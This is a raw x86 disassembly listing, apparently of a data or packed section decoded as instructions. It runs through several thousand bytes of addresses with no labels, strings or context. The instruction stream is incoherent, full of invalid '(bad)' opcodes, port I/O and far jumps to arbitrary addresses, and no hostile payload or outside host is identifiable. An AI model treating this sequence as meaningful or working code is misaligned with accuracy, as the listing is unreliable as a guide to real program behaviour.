  422e9a:	sub    ebx,ebp
  422e9c:	cmp    eax,0xd2d22e01
  422ea1:	pop    ecx
  422ea2:	push   eax
  422ea3:	push   0x3
  422ea5:	xor    al,0xfc
  422ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ea8:	cli    
  422ea9:	jp     0x422e65
  422eab:	mul    ebx
  422ead:	lahf   
  422eae:	or     al,BYTE PTR [esi]
  422eb0:	and    ch,BYTE PTR [ebp-0x1cd717a3]
  422eb6:	in     al,dx
  422eb7:	xlat   BYTE PTR ds:[ebx]
  422eb8:	leave  
  422eb9:	lahf   
  422eba:	jp     0x422ec3
  422ebc:	xchg   edi,eax
  422ebd:	push   ebp
  422ebe:	shl    DWORD PTR [edi+0x1cdcba01],cl
  422ec4:	xor    esp,DWORD PTR [ecx]
  422ec6:	or     DWORD PTR [edx-0x121d2459],ebp
  422ecc:	imul   esi,esp,0xffffffa8
  422ecf:	inc    eax
  422ed0:	xor    eax,0xcc6c2845
  422ed5:	adc    edx,DWORD PTR [ebx-0x57]
  422ed8:	call   0x4e60347c
  422edd:	(bad)
  422ee0:	pop    ecx
  422ee1:	push   edi
  422ee2:	lods   al,BYTE PTR ds:[esi]
  422ee3:	les    ecx,FWORD PTR [ebx-0x66]
  422ee6:	mov    al,0xb6
  422ee8:	(bad)  
  422ee9:	stos   BYTE PTR es:[edi],al
  422eea:	pop    ss
  422eeb:	and    bl,dh
  422eed:	jle    0x422ec0
  422eef:	mov    ecx,?
  422ef1:	int3   
  422ef2:	sbb    al,BYTE PTR [edi]
  422ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ef5:	int    0xed
  422ef7:	pop    es
  422ef8:	or     edx,DWORD PTR [ecx]
  422efa:	enter  0xd7e8,0xea
  422efe:	or     al,0x2b
  422f00:	nop
  422f01:	test   al,0xe0
  422f03:	and    BYTE PTR [esi],cl
  422f05:	add    DWORD PTR [ecx-0x621fc170],esi
  422f0b:	je     0x422f1a
  422f0d:	pop    edi
  422f0e:	and    DWORD PTR [ebp+0x7878ccde],0x2e
  422f15:	test   eax,0x7683eb8e
  422f1a:	or     ecx,ecx
  422f1c:	xchg   edx,eax
  422f1d:	sbb    eax,0x6f9918ae
  422f22:	(bad)  
  422f24:	fbstp  TBYTE PTR [ebx+ecx*4]
  422f27:	shl    DWORD PTR [edi-0x2d],1
  422f2a:	leave  
  422f2b:	or     eax,0xdcc00440
  422f30:	enter  0x4e51,0xa2
  422f34:	ret    0x9752
  422f37:	je     0x422ee1
  422f39:	into   
  422f3a:	mov    gs,WORD PTR [eax-0x4bd8b74d]
  422f40:	call   0xde64:0xb1ae526
  422f47:	sub    ebx,DWORD PTR [edi+0x73]
  422f4a:	mov    edx,0x4443c575
  422f4f:	xor    eax,0x6ad7758
  422f54:	(bad)  
  422f55:	out    0x49,al
  422f57:	stos   BYTE PTR es:[edi],al
  422f58:	jle    0x422f4a
  422f5a:	mov    ch,BYTE PTR [eax]
  422f5c:	shl    BYTE PTR [eax+0x56e02d1a],cl
  422f62:	xchg   ecx,eax
  422f63:	or     al,0x3d
  422f65:	adc    eax,0x4c2e95f5
  422f6a:	daa    
  422f6b:	add    BYTE PTR [ecx],0xcf
  422f6e:	out    dx,eax
  422f6f:	fmul   st,st(4)
  422f71:	ins    DWORD PTR es:[edi],dx
  422f72:	mov    edx,0x88c52de3
  422f77:	(bad)  
  422f78:	pop    ss
  422f79:	add    al,0xe4
  422f7b:	lea    edx,[edi-0x78]
  422f7e:	or     BYTE PTR ds:0x964b8c45,0xab
  422f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f86:	mov    edi,0x7467edee
  422f8b:	cmp    al,ah
  422f8d:	add    dh,BYTE PTR [eax+0x37]
  422f90:	pop    ebp
  422f91:	xor    eax,DWORD PTR ds:[ecx]
  422f94:	(bad)  
  422f95:	call   0x6d3e:0x614d22f1
  422f9c:	shl    DWORD PTR [esi],0x2d
  422f9f:	aas    
  422fa0:	push   edi
  422fa1:	xchg   edx,eax
  422fa2:	in     al,dx
  422fa3:	out    0x93,eax
  422fa5:	mov    ds:0x29147c14,al
  422faa:	or     ah,BYTE PTR [ecx-0xe]
  422fad:	adc    dh,dh
  422faf:	cmp    ah,BYTE PTR [edi+ebp*8-0x18]
  422fb3:	fadd   QWORD PTR [ebx-0x1f91e74c]
  422fb9:	inc    ebx
  422fba:	neg    BYTE PTR [ebx+0x2d]
  422fbd:	inc    edi
  422fbe:	cmp    eax,0x32df470d
  422fc3:	stos   DWORD PTR es:[edi],eax
  422fc4:	ins    BYTE PTR es:[edi],dx
  422fc5:	mov    al,ds:0x5405ec67
  422fca:	dec    esp
  422fcb:	lods   eax,DWORD PTR ds:[esi]
  422fcc:	retf   
  422fcd:	inc    edx
  422fce:	lds    eax,FWORD PTR [edx]
  422fd0:	pusha  
  422fd1:	mov    BYTE PTR [edx-0x7ffc904e],bh
  422fd7:	push   edx
  422fd8:	mov    esp,0x175484f7
  422fdd:	fs mov edx,0x1eaebeae
  422fe3:	into   
  422fe4:	mov    eax,ds:0x310d23fc
  422fe9:	sbb    DWORD PTR [edi+0x36363d79],esi
  422fef:	push   ss
  422ff0:	mov    ah,0x37
  422ff2:	mov    ecx,esi
  422ff4:	fild   QWORD PTR [ebp+0x791edffb]
  422ffa:	dec    edi
  422ffb:	fsub   st,st(4)
  422ffd:	and    BYTE PTR [edx+0x38],dh
  423000:	push   ss
  423001:	mov    ds:0x774987be,eax
  423006:	jge    0x42303a
  423008:	mov    ah,0xe0
  42300a:	popa   
  42300b:	cmp    eax,0xb3e4e48b
  423010:	loopne 0x423012
  423012:	inc    ebx
  423013:	jnp    0x42303c
  423015:	xor    BYTE PTR [ebp-0x20],bl
  423018:	lods   eax,DWORD PTR ds:[esi]
  423019:	push   eax
  42301a:	std    
  42301b:	or     al,0xe3
  42301d:	push   edi
  42301e:	(bad)  
  42301f:	repz jge 0x42303b
  423022:	or     edx,0xffffffba
  423025:	jbe    0x423099
  423027:	add    BYTE PTR [esi-0x65edc96f],al
  42302d:	pop    eax
  42302e:	in     al,dx
  42302f:	ds ins DWORD PTR es:[edi],dx
  423031:	inc    esi
  423032:	inc    al
  423034:	mov    cl,0x39
  423036:	popf   
  423037:	pop    ebx
  423038:	mov    ds:0x9a836e84,eax
  42303d:	out    dx,eax
  42303e:	pushf  
  42303f:	ds mov ebx,edx
  423042:	adc    ecx,edx
  423044:	inc    edi
  423045:	jl     0x422fdd
  423047:	arpl   WORD PTR [edx-0x5128fea8],bx
  42304d:	mov    ebp,0x5bf7ebe1
  423052:	(bad)  
  423053:	or     al,0xc9
  423055:	clc    
  423056:	ret    
  423057:	sub    al,0xd8
  423059:	dec    cl
  42305b:	add    al,0xf1
  42305d:	xor    al,BYTE PTR [esi+edi*2+0x7d61ec4]
  423064:	clc    
  423065:	push   ecx
  423066:	push   eax
  423067:	mov    BYTE PTR [ecx+edi*1-0x66],ah
  42306b:	out    dx,eax
  42306c:	push   ecx
  42306d:	xchg   ebp,eax
  42306e:	push   es
  42306f:	add    DWORD PTR [ebx],edi
  423071:	repz retf 
  423073:	dec    edi
  423074:	sti    
  423075:	and    BYTE PTR [edi+0x66],cl
  423078:	mov    BYTE PTR [edx+0x1815c9dc],dh
  42307e:	inc    esp
  42307f:	clc    
  423080:	jecxz  0x423015
  423082:	pop    ecx
  423083:	adc    BYTE PTR [eax],bh
  423085:	outs   dx,DWORD PTR ds:[esi]
  423086:	adc    al,0xe8
  423088:	mov    esi,0xd621c3ce
  42308d:	add    DWORD PTR [esi],ebx
  42308f:	dec    esi
  423090:	xchg   BYTE PTR [ecx-0x59],al
  423093:	sti    
  423094:	push   ecx
  423095:	xor    eax,0xf66b3bd8
  42309a:	xor    ah,cl
  42309c:	jmp    0x213793dc
  4230a1:	out    0x88,al
  4230a3:	mov    ecx,0x59559b1e
  4230a8:	dec    ebx
  4230a9:	ja     0x423053
  4230ab:	pusha  
  4230ac:	xchg   edx,eax
  4230ad:	and    esi,DWORD PTR [esi]
  4230af:	(bad)
  4230b4:	sub    BYTE PTR [eax],dh
  4230b6:	push   edx
  4230b7:	inc    esi
  4230b8:	sar    DWORD PTR [ebx-0x33],0xe8
  4230bc:	ret    
  4230bd:	iret   
  4230be:	xor    DWORD PTR [ecx-0x2313070b],edx
  4230c4:	(bad)  
  4230c5:	fild   DWORD PTR [ebx-0x67]
  4230c8:	aad    0xc3
  4230ca:	rcr    BYTE PTR ds:0x78cdf3fb,0xc0
  4230d1:	mov    esp,DWORD PTR [ebx]
  4230d3:	mov    bh,0x12
  4230d5:	scas   eax,DWORD PTR es:[edi]
  4230d6:	cmp    edi,esp
  4230d8:	pop    ss
  4230d9:	clc    
  4230da:	sbb    al,0xca
  4230dc:	cmp    eax,0xaed1f9d2
  4230e1:	push   esp
  4230e2:	jo     0x4230ec
  4230e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230e5:	mov    al,0x7b
  4230e7:	es mov eax,0x486e6c69
  4230ed:	out    0x14,eax
  4230ef:	cld    
  4230f0:	repnz or cl,BYTE PTR [ebx]
  4230f3:	pop    edx
  4230f4:	(bad)  
  4230f5:	fsub   DWORD PTR [esi-0x66]
  4230f8:	push   eax
  4230f9:	or     BYTE PTR [ecx],al
  4230fb:	mov    al,ds:0xe52bed83
  423100:	push   ebx
  423101:	mov    edx,0xb509173
  423106:	jmp    0x8c9c19c5
  42310b:	bound  ebx,QWORD PTR [edx-0xd698737]
  423111:	mov    cl,0xd4
  423113:	mov    ds:0xa8d365d4,eax
  423118:	jnp    0x423189
  42311a:	mov    edi,0x9117066a
  42311f:	mov    dh,0xc6
  423121:	pop    eax
  423122:	or     eax,DWORD PTR [esi]
  423124:	imul   ebp,DWORD PTR [ebx+0xae8c7e4],0xc0ed58ac
  42312e:	ret    0xc22b
  423131:	pop    esi
  423132:	rol    DWORD PTR [ebx+0x18],cl
  423135:	mov    dh,0xab
  423137:	inc    edx
  423138:	in     al,dx
  423139:	xor    BYTE PTR [esi+esi*1],ah
  42313c:	rol    ebx,0xe1
  42313f:	mov    ds:0xc1ead3d9,al
  423144:	push   ebp
  423145:	leave  
  423146:	popf   
  423147:	inc    ebx
  423148:	loopne 0x423186
  42314a:	les    ecx,FWORD PTR [ecx-0x6a]
  42314d:	arpl   bx,si
  42314f:	rol    DWORD PTR ds:0x9d96ee34,1
  423155:	xor    BYTE PTR [edx+0x23f30b10],dh
  42315b:	cmp    al,0xf1
  42315d:	mov    dl,0x78
  42315f:	or     ebp,edx
  423161:	pop    ds
  423162:	or     al,0x8b
  423164:	pop    edi
  423165:	(bad)  
  423166:	loopne 0x423121
  423168:	(bad)  
  423169:	mov    fs,WORD PTR [eax]
  42316b:	dec    ebx
  42316c:	sub    eax,0x986301f2
  423171:	lock mov dl,0xfd
  423174:	stc    
  423175:	test   BYTE PTR [eax+0x60],bl
  423178:	fcmovnu st,st(2)
  42317a:	rcr    BYTE PTR [ebx+0x1aaba0ea],0x29
  423181:	xor    DWORD PTR [ebp-0x25],ecx
  423184:	ds std 
  423186:	push   ss
  423187:	es (bad) 
  423189:	(bad)  
  42318a:	fsub   DWORD PTR [edi+0x7d]
  42318d:	push   ebx
  42318e:	arpl   bp,sp
  423190:	cmp    bh,dl
  423192:	sub    BYTE PTR [esi-0x51d5f2d1],0xf6
  423199:	inc    edi
  42319a:	(bad)  
  42319b:	cmp    eax,DWORD PTR [ecx+edx*4-0x23]
  42319f:	inc    ebp
  4231a0:	cmp    ecx,DWORD PTR [eax-0x64]
  4231a3:	adc    ch,BYTE PTR [ebx-0x72bfb14a]
  4231a9:	shl    dl,cl
  4231ab:	push   ecx
  4231ac:	je     0x4231ce
  4231ae:	inc    esp
  4231af:	inc    ebp
  4231b0:	clc    
  4231b1:	(bad)  
  4231b2:	aad    0x2c
  4231b4:	inc    ebp
  4231b5:	adc    bl,dh
  4231b7:	inc    ebp
  4231b8:	mov    ebx,DWORD PTR [ebp-0x48b10444]
  4231be:	mov    dh,0x3c
  4231c0:	dec    ebx
  4231c1:	in     eax,dx
  4231c2:	(bad)  
  4231c3:	pop    esi
  4231c4:	ficomp DWORD PTR [ecx-0x12]
  4231c7:	aaa    
  4231c8:	or     dl,BYTE PTR [edx-0x23]
  4231cb:	ror    DWORD PTR [edi-0x11703db5],cl
  4231d1:	adc    BYTE PTR [ecx-0x125fa042],cl
  4231d7:	clc    
  4231d8:	mov    dh,0xca
  4231da:	add    DWORD PTR [esi],edi
  4231dc:	add    dl,BYTE PTR [esp+eiz*8+0x2a]
  4231e0:	push   ss
  4231e1:	icebp  
  4231e2:	xchg   esi,eax
  4231e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231e4:	call   0xf295:0xd6b16771
  4231eb:	adc    bl,ch
  4231ed:	div    BYTE PTR [edx-0x19]
  4231f0:	add    eax,0x18a79718
  4231f5:	bound  esi,QWORD PTR [edi]
  4231f7:	sbb    edx,DWORD PTR [ebx-0x37]
  4231fa:	fstp   TBYTE PTR [ecx+0x41922b1a]
  423200:	hlt    
  423201:	test   al,0x76
  423203:	cdq    
  423204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423205:	retf   
  423206:	dec    edx
  423207:	loopne 0x4231e7
  423209:	neg    ch
  42320b:	mov    bh,0x6c
  42320d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42320e:	int    0x3b
  423210:	pop    ecx
  423211:	fbld   TBYTE PTR [eax+0xe54755e]
  423217:	xor    edi,ebx
  423219:	xchg   edx,eax
  42321a:	mov    ah,0x38
  42321c:	(bad)  
  42321d:	sub    BYTE PTR [ebx+0x213ff40b],dh
  423223:	pushf  
  423224:	sbb    eax,0x2916b21f
  423229:	cdq    
  42322a:	jne    0x4232a7
  42322c:	or     al,BYTE PTR [edi+0x24]
  42322f:	les    esi,FWORD PTR [ebp+0xb0bbb6d]
  423235:	(bad)  
  423236:	popf   
  423237:	xor    BYTE PTR [edx+0x2550b8a4],cl
  42323d:	push   es
  42323e:	arpl   WORD PTR [esi],dx
  423240:	les    edx,FWORD PTR [edi]
  423242:	and    eax,DWORD PTR [ebp+0x55]
  423245:	(bad)  
  423246:	jg     0x4231d1
  423248:	dec    ecx
  423249:	mov    dh,0x13
  42324b:	inc    ecx
  42324c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42324d:	pop    ebp
  42324e:	push   ecx
  42324f:	pushf  
  423250:	cmp    eax,0x277f050a
  423255:	jl     0x423262
  423257:	imul   esp,DWORD PTR [ecx-0x5ac0d313],0x9865711c
  423261:	jp     0x423232
  423263:	nop
  423264:	inc    esi
  423265:	cmp    ecx,esp
  423267:	jno    0x423297
  423269:	lods   al,BYTE PTR ds:[esi]
  42326a:	jmp    DWORD PTR [edi-0x5da859f7]
  423270:	inc    edx
  423271:	mov    BYTE PTR [eax+edx*4],ch
  423274:	leave  
  423275:	jne    0x42324b
  423277:	clc    
  423278:	pop    ebp
  423279:	mov    esp,0x2e85caa7
  42327e:	inc    esp
  42327f:	ja     0x423202
  423281:	outs   dx,DWORD PTR ds:[esi]
  423282:	dec    edi
  423283:	mov    fs,WORD PTR [edx+0x117a16ec]
  423289:	stc    
  42328a:	and    BYTE PTR [edi+0x16],0x28
  42328e:	mov    esi,0x32602f61
  423293:	push   ds
  423294:	jle    0x423274
  423296:	xchg   edx,eax
  423297:	out    dx,al
  423298:	adc    DWORD PTR [ebx],esi
  42329a:	jns    0x423250
  42329c:	dec    edx
  42329d:	cmp    BYTE PTR ds:0x9013ae75,ch
  4232a3:	pop    ebp
  4232a4:	test   al,0x4d
  4232a6:	es mov esp,0x22dfe50b
  4232ac:	imul   edx,DWORD PTR [ebx],0xffffff92
  4232af:	les    edx,FWORD PTR [edi-0x422396f7]
  4232b5:	xor    BYTE PTR [eax-0x141b4905],dh
  4232bb:	das    
  4232bc:	sub    dh,bl
  4232be:	mov    bh,0xa6
  4232c0:	fwait
  4232c1:	(bad)  
  4232c2:	mov    edi,0x5637d48f
  4232c7:	push   esi
  4232c8:	outs   dx,BYTE PTR ds:[esi]
  4232c9:	clc    
  4232ca:	push   0x31
  4232cc:	push   ss
  4232cd:	push   edi
  4232ce:	xchg   BYTE PTR [ecx-0x22fb16ad],ah
  4232d4:	jbe    0x423355
  4232d6:	pop    ds
  4232d7:	mov    ds:0x12c4c53f,eax
  4232dc:	adc    DWORD PTR [edi+0xc],esi
  4232df:	hlt    
  4232e0:	ins    BYTE PTR es:[edi],dx
  4232e1:	add    eax,0xfa364119
  4232e6:	pop    ebp
  4232e7:	push   0x13
  4232e9:	jg     0x4232ba
  4232eb:	cmovns edx,DWORD PTR [eax+0x39]
  4232ef:	mov    eax,ds:0x871a0394
  4232f4:	into   
  4232f5:	sbb    DWORD PTR [edx-0x286adedd],ebx
  4232fb:	pop    ebx
  4232fc:	pop    esp
  4232fd:	add    cl,BYTE PTR [ebx+0x5af86620]
  423303:	dec    ebx
  423304:	repz adc ah,dh
  423307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423308:	repz lahf 
  42330a:	and    DWORD PTR [ebx+ebp*8+0x3d],edi
  42330e:	fucomi st,st(0)
  423310:	pop    esp
  423311:	jae    0x423328
  423313:	(bad)  
  423314:	call   0xf2e8cad4
  423319:	stos   DWORD PTR es:[edi],eax
  42331a:	addr16 hlt 
  42331c:	inc    ebx
  42331e:	scas   al,BYTE PTR es:[edi]
  42331f:	enter  0xd544,0x7f
  423323:	inc    DWORD PTR [edi+0x134847ed]
  423329:	gs test al,0x70
  42332c:	rcr    DWORD PTR [ecx-0x39],cl
  42332f:	or     eax,0x482033c1
  423334:	lods   al,BYTE PTR ds:[esi]
  423335:	out    dx,eax
  423336:	push   ss
  423337:	xlat   BYTE PTR ds:[ebx]
  423338:	jge    0x42333f
  42333a:	push   ecx
  42333b:	push   ecx
  42333c:	std    
  42333d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42333e:	mov    bl,0xe1
  423340:	and    ch,dl
  423342:	lds    ebp,FWORD PTR [esi]
  423344:	lock dec ecx
  423346:	sub    BYTE PTR [esi],dh
  423348:	xchg   edi,eax
  423349:	inc    esp
  42334a:	cdq    
  42334b:	mov    dh,0x7f
  42334d:	mov    ds:0x7394287a,eax
  423352:	leave  
  423353:	sahf   
  423354:	or     ebx,DWORD PTR [ebx+ebx*8+0x64]
  423358:	in     al,0xb
  42335a:	xchg   ebx,eax
  42335b:	jmp    0x3238:0xa866368f
  423362:	fdivr  DWORD PTR [edi+0x1a629f4c]
  423368:	adc    edi,ebx
  42336a:	fisubr WORD PTR [ebx-0x5b]
  42336d:	push   esi
  42336e:	sub    eax,0x8e660113
  423373:	mov    ch,0x80
  423375:	ret    0x6c98
  423378:	jo     0x4233ac
  42337a:	adc    DWORD PTR [eax-0x4],0x54aa169e
  423381:	pusha  
  423382:	or     cl,BYTE PTR [esi-0x49654bd7]
  423388:	in     eax,0x60
  42338a:	inc    eax
  42338b:	loop   0x423335
  42338d:	mov    esi,0x5e05cea6
  423392:	xor    al,0x0
  423394:	rol    DWORD PTR [edx+ebp*2+0x2747eda0],1
  42339b:	call   0xb64813dd
  4233a0:	fidiv  DWORD PTR [edi]
  4233a2:	or     eax,0xb71180e4
  4233a7:	fidiv  DWORD PTR [esi+0x32]
  4233aa:	mov    eax,0x6421e45c
  4233af:	mov    bh,0x21
  4233b1:	daa    
  4233b2:	fwait
  4233b3:	and    esp,DWORD PTR [ecx-0x5662e2fd]
  4233b9:	mov    dh,0x23
  4233bb:	mov    ebp,?
  4233bd:	mov    dl,0x6f
  4233bf:	mov    ah,0x4
  4233c1:	shl    DWORD PTR [eax],cl
  4233c3:	sbb    edi,DWORD PTR [ecx+0x6e]
  4233c6:	push   ss
  4233c7:	jmp    0x423395
  4233c9:	pop    ecx
  4233ca:	xor    esp,DWORD PTR [esi]
  4233cc:	retf   0x33fc
  4233cf:	out    0x22,eax
  4233d1:	repz cmp cl,dl
  4233d4:	jnp    0x423395
  4233d6:	cmp    ebx,ecx
  4233d8:	push   ds
  4233d9:	cmp    BYTE PTR [ecx+0x32d18d54],ah
  4233df:	gs loope 0x423440
  4233e2:	loopne 0x423369
  4233e4:	mov    esi,0x3e3849
  4233e9:	cmp    BYTE PTR [ebp+0x4e],bh
  4233ec:	cmp    dh,dh
  4233ee:	mov    ecx,0x2805065b
  4233f3:	gs inc edi
  4233f5:	xchg   edx,eax
  4233f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233f7:	inc    edx
  4233f8:	cs dec ebp
  4233fa:	mov    ds:0x7d72ee12,al
  4233ff:	fsub   QWORD PTR [eax-0x3619aff3]
  423405:	push   ebp
  423406:	mov    ebp,0x74c7cccf
  42340b:	fadd   st,st(0)
  42340d:	imul   edx,DWORD PTR [edi+0x66],0xffffffe2
  423411:	fimul  WORD PTR [edi]
  423413:	jmp    0x423458
  423415:	pusha  
  423416:	sub    edi,edx
  423418:	jp     0x12f2d769
  42341e:	in     eax,dx
  42341f:	sahf   
  423420:	scas   al,BYTE PTR es:[edi]
  423421:	xchg   esp,eax
  423422:	inc    edi
  423423:	pop    ds
  423424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423425:	and    al,0xc9
  423427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423428:	add    eax,0x3c37a856
  42342d:	xchg   esp,eax
  42342e:	inc    ecx
  42342f:	sbb    eax,esp
  423431:	stos   BYTE PTR es:[edi],al
  423432:	sub    cl,BYTE PTR [eax]
  423434:	fcomp  QWORD PTR [ebp-0x35048fd1]
  42343a:	push   ss
  42343b:	add    BYTE PTR [edi+ebp*4-0x6e0a8ffb],ah
  423442:	pop    ds
  423443:	retf   0x4db2
  423446:	cmp    eax,0x972c0d2a
  42344b:	icebp  
  42344c:	lahf   
  42344d:	dec    ebp
  42344e:	and    eax,0x18f2459
  423453:	sbb    edi,DWORD PTR [esi]
  423455:	and    cl,BYTE PTR [eax-0x37]
  423458:	fwait
  423459:	cs (bad) 
  42345b:	or     BYTE PTR [ebx-0x71],al
  42345e:	push   ecx
  42345f:	(bad)  
  423460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423461:	stos   BYTE PTR es:[edi],al
  423462:	fistp  WORD PTR [ebx+ecx*8-0x38]
  423466:	xchg   DWORD PTR [esi-0x4a],ecx
  423469:	test   DWORD PTR [ebx-0x34],esp
  42346c:	shl    DWORD PTR [ebx],0xf6
  42346f:	jnp    0x42344b
  423471:	sahf   
  423472:	pop    ebx
  423473:	das    
  423474:	and    cl,ah
  423476:	sub    BYTE PTR [edi-0x14],bl
  423479:	jo     0x423420
  42347b:	jo     0x423453
  42347d:	ret    0x6758
  423480:	aas    
  423481:	mov    cl,0xf4
  423483:	mov    ebx,0xf601b3d1
  423488:	jno    0x42344d
  42348a:	mov    WORD PTR [esi],ss
  42348c:	jbe    0x423413
  42348e:	mov    cl,0xf8
  423490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423491:	xchg   DWORD PTR [edi-0x579fa660],edi
	...
  423513:	add    dl,dl
  423515:	in     al,dx
  423516:	and    edx,DWORD PTR [ecx]
  423518:	aas    
  423519:	fcomip st,st(2)
  42351b:	out    dx,eax
  42351c:	or     DWORD PTR [esi+0x6bf8eacd],ebp
  423522:	sbb    BYTE PTR [ecx],ah
  423524:	cmp    edx,ecx
  423526:	add    DWORD PTR [eax],eax
  423528:	imul   eax,DWORD PTR [edi],0x0
  42352b:	add    ah,dl
  42352d:	and    edx,DWORD PTR [ebp+eax*2-0x26]
  423531:	cmc    
  423532:	add    al,0x82
  423534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423535:	jmp    0xbd70:0xc5eeb34b
  42353c:	test   BYTE PTR [ebp-0x3e],bh
  42353f:	sti    
  423540:	pop    ecx
  423541:	(bad)  
  423543:	mov    bl,0x67
  423545:	push   es
  423546:	pop    ebp
  423547:	dec    edx
  423548:	repnz add BYTE PTR [esi+ecx*8+0x3a90c3a2],cl
  423550:	call   0x9fa847e6
  423555:	push   esp
  423556:	imul   edi,esi,0xffffffc4
  423559:	pop    edi
  42355a:	(bad)  
  42355c:	adc    eax,0x3d4c3973
  423561:	add    al,0xaa
  423563:	fwait
  423564:	adc    ah,BYTE PTR [edx+0x48]
  423567:	pop    ebp
  423568:	adc    BYTE PTR [ebp-0x52],bl
  42356b:	cld    
  42356c:	ror    edx,cl
  42356e:	adc    eax,0xb7872107
  423573:	mov    fs,WORD PTR [ecx-0x1e053662]
  423579:	arpl   WORD PTR [edi+0x72],bp
  42357c:	(bad)  
  42357d:	psadbw mm0,QWORD PTR [ebp-0x73]
  423581:	neg    BYTE PTR [ebx]
  423583:	cmp    DWORD PTR [edx*8+0x8c25501],eax
  42358a:	dec    edi
  42358b:	xor    BYTE PTR [esi+edx*8],dl
  42358e:	inc    esp
  42358f:	cld    
  423590:	fst    QWORD PTR [ebx-0x23]
  423593:	pop    ebp
  423594:	mov    dh,0xc1
  423596:	xor    BYTE PTR [eax+esi*2],bl
  423599:	dec    ebx
  42359a:	sub    DWORD PTR [ebp+edi*1-0x73],ebx
  42359e:	in     al,0x91
  4235a0:	es pop ecx
  4235a2:	xchg   ebx,eax
  4235a3:	mov    al,0xaf
  4235a5:	sub    DWORD PTR [edx],edx
  4235a7:	mov    ds:0xf784aa23,eax
  4235ac:	dec    eax
  4235ad:	mov    al,ds:0xe065cc82
  4235b2:	mov    WORD PTR [bx+di+0x3ab2],?
  4235b7:	leave  
  4235b8:	std    
  4235b9:	(bad)  
  4235bb:	pop    ds
  4235bc:	and    DWORD PTR [eax-0x6944b899],edi
  4235c2:	push   ebp
  4235c3:	mov    edx,0x681636cb
  4235c8:	outs   dx,DWORD PTR ds:[esi]
  4235c9:	mov    ebx,0x1d3046a6
  4235ce:	ror    ch,0x69
  4235d1:	xor    bh,BYTE PTR [esi+ebx*2]
  4235d4:	add    ebx,edi
  4235d6:	or     al,0x23
  4235d8:	stos   BYTE PTR es:[edi],al
  4235d9:	retfw  
  4235db:	adc    esp,DWORD PTR [eax-0x70d64839]
  4235e1:	ret    0x3aac
  4235e4:	out    dx,al
  4235e5:	xchg   edi,eax
  4235e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235e7:	mov    edi,ds
  4235e9:	loopne 0x423591
  4235eb:	xor    eax,0xcb7c9920
  4235f0:	dec    edx
  4235f1:	pop    esp
  4235f2:	push   edx
  4235f3:	jg     0x42357f
  4235f5:	mov    dl,0x1a
  4235f7:	push   0x4fd779ec
  4235fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235fd:	mov    al,ds:0x69b1409a
  423602:	inc    esi
  423603:	cld    
  423604:	dec    edi
  423605:	mov    esp,0x522caf09
  42360a:	add    al,0x99
  42360c:	mov    eax,0xda2cd237
  423611:	jmp    0x4235d8
  423613:	dec    edi
  423614:	leave  
  423615:	clc    
  423616:	nop
  423617:	dec    ebp
  423618:	out    0x21,eax
  42361a:	mov    edi,0x449ea284
  42361f:	lahf   
  423620:	xor    DWORD PTR [ecx-0x2d909b3c],esi
  423626:	lods   eax,DWORD PTR ds:[esi]
  423627:	cdq    
  423628:	jno    0x42366c
  42362a:	and    bl,BYTE PTR [ebp+0x60d0e6d4]
  423630:	mov    esp,0x1a9ecb29
  423635:	jp     0x423678
  423637:	push   edx
  423638:	push   ecx
  423639:	test   al,0xd4
  42363b:	pop    DWORD PTR [eax-0x3]
  42363e:	or     DWORD PTR ds:0x9f8bd7f4,ebp
  423644:	test   al,0x1f
  423646:	out    0x65,eax
  423648:	or     DWORD PTR [ebx-0x5ce6459a],0x20
  42364f:	repnz scas eax,DWORD PTR es:[edi]
  423651:	mov    ecx,0x937ea81b
  423656:	mov    bh,0x7e
  423658:	push   ds
  423659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42365a:	jbe    0x4236b2
  42365c:	js     0x42361d
  42365e:	and    DWORD PTR [edi],ebp
  423660:	fidiv  WORD PTR [esi-0x1b]
  423664:	loope  0x423699
  423666:	jbe    0x4236cf
  423668:	retf   0xb24b
  42366b:	rol    DWORD PTR [esi-0x20],cl
  42366e:	dec    esp
  42366f:	inc    ebp
  423670:	div    BYTE PTR [edi+0x51]
  423673:	jno    0x4236a4
  423675:	jmp    0x423667
  423677:	jecxz  0x4236f0
  423679:	scas   eax,DWORD PTR es:[edi]
  42367a:	test   BYTE PTR [ebx],0x99
  42367d:	mov    dh,0x6a
  42367f:	adc    bp,WORD PTR [ebp+0x58]
  423683:	je     0x423683
  423685:	ins    DWORD PTR es:[edi],dx
  423686:	dec    eax
  423687:	xor    eax,0x88e0776d
  42368c:	and    eax,0x530c8a50
  423691:	adc    cl,BYTE PTR [edx+0x5c7b1abf]
  423697:	call   0xf38:0x12fee509
  42369e:	pusha  
  42369f:	jmp    0xd487f93b
  4236a4:	imul   esi,DWORD PTR [edx-0x23d9be12],0xef8301b0
  4236ae:	call   0x8ad3:0xd2537ab9
  4236b5:	dec    ebx
  4236b6:	ret    
  4236b7:	scas   al,BYTE PTR es:[edi]
  4236b8:	adc    ebx,DWORD PTR [edi+esi*8+0x15]
  4236bc:	psrlw  mm0,QWORD PTR [esi]
  4236bf:	mov    DWORD PTR [ebp-0x721e6aa2],esi
  4236c5:	popf   
  4236c6:	aas    
  4236c7:	dec    esp
  4236c8:	daa    
  4236c9:	push   esi
  4236ca:	xor    al,0x1c
  4236cc:	adc    edi,DWORD PTR [edx+0x75d18824]
  4236d2:	push   cs
  4236d3:	cmp    ebx,DWORD PTR [edx]
  4236d5:	mov    al,0xd9
